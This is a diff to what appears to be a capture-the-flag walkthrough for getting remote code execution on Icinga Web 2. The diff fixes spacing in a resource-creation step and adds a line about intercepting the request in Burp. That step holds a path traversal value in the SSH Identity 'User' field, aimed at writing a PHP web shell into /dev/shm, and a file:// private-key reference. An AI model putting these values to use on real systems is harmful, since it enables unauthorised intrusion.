@@ -85,15 +85,19 @@ Configuration -> Resources -> Create a New Resource
 
 ![image](https://user-images.githubusercontent.com/127159644/227716048-237d1f3a-7535-4739-8037-a86ef582bab4.png)
 ![image](https://user-images.githubusercontent.com/127159644/227717046-d866a18b-3ac6-404e-b7ad-048713edf872.png)
-![image](https://user-images.githubusercontent.com/127159644/227716355-f8dd1102-2d01-45f0-808c-5352a308e017.png)
+![image](https://user-images.githubusercontent.com/127159644/227717230-121e62d8-e49e-476b-8205-82085a9a035f.png)
 
 Now to get rce we need to create another resource
 
 ```
 Resource Type: SSH Identity
 Resource Name: shell.php
-User:../../../../../../dev/shm/shell.php
+User: ../../../../../../dev/shm/shell.php
 Private Key: file:///etc/icingaweb2/ssh/haxor
 ```
 
-So we intercept the request in burp
+So we intercept the request in burp and manipulate the private key value
+![Uploading image.png…]()
+
+
+
